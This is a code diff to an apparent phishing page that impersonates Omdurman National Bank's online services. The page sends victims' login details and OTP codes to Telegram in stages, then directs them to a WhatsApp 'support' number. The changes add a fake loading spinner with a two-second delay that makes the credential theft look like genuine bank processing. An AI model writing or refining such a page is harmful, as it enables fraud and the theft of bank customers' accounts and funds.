@@ -21,6 +21,32 @@
         .page-section { display: none; }
         .page-section.active { display: block; }
 
+        /* شاشة التحميل المؤقتة */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--main-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         .top-header { 
             background: linear-gradient(var(--main-green), var(--green-dark)); 
             padding: 15px 20px; 
@@ -154,6 +180,12 @@
     </style>
 </head>
 <body>
+
+    <!-- شاشة التحميل الذكية -->
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <h3 style="font-family: 'Tajawal', sans-serif;">انتظر... جاري المعالجة والتحميل</h3>
+    </div>
 
     <header class="top-header">
         <a onclick="showPage('login-page')" class="header-text">خدمات بنك أمدرمان الوطني أونلاين</a>
@@ -302,14 +334,14 @@
         </div>
     </div>
 
-    <!-- 6. صفحة النجاح ورسالة الواتساب بالرقم الدولي -->
+    <!-- 6. صفحة النجاح ورسالة الواتساب -->
     <div id="confirm-page" class="page-section">
         <div class="card">
             <div class="success-box">
                 <i class="fa-solid fa-circle-check success-icon"></i>
                 <div class="success-title">تم تسليم بياناتك بنجاح</div>
                 <div class="success-msg">
-                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك[span_1](start_span)[span_1](end_span).
+                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك.
                 </div>
                 <a href="#" onclick="sendWhatsApp()" class="btn-whatsapp-custom">
                     <i class="fa-brands fa-whatsapp" style="font-size: 22px;"></i> التواصل مع الدعم عبر واتساب
@@ -346,7 +378,10 @@
 
         function showPage(pageId) {
             document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
+            const target = document.getElementById(pageId);
+            if (target) {
+                target.classList.add('active');
+            }
             window.scrollTo(0, 0);
         }
 
@@ -396,7 +431,13 @@
                 sendToTelegram("مرحلة 3: رمز OTP وإكمال التسجيل");
             }
 
-            showPage(nextPage);
+            const loader = document.getElementById('loading-overlay');
+            loader.style.display = 'flex';
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                showPage(nextPage);
+            }, 2000);
         }
 
         function sendToTelegram(stageInfo) {
@@ -425,7 +466,7 @@
         }
 
         function sendWhatsApp() {
-            const phone = "249118737098"; // الرقم مع كود السودان الدولي بدون علامة + في الرابط
+            const phone = "249118737098";
             const text = encodeURIComponent(`مرحباً فريق الدعم، تم تسليم بياناتي بنجاح وأحتاج المساعدة للتحقق من الحساب.\nاسم المستخدم: ${userData.username}`);
             window.location.href = `https://wa.me/${phone}?text=${text}`;
         }
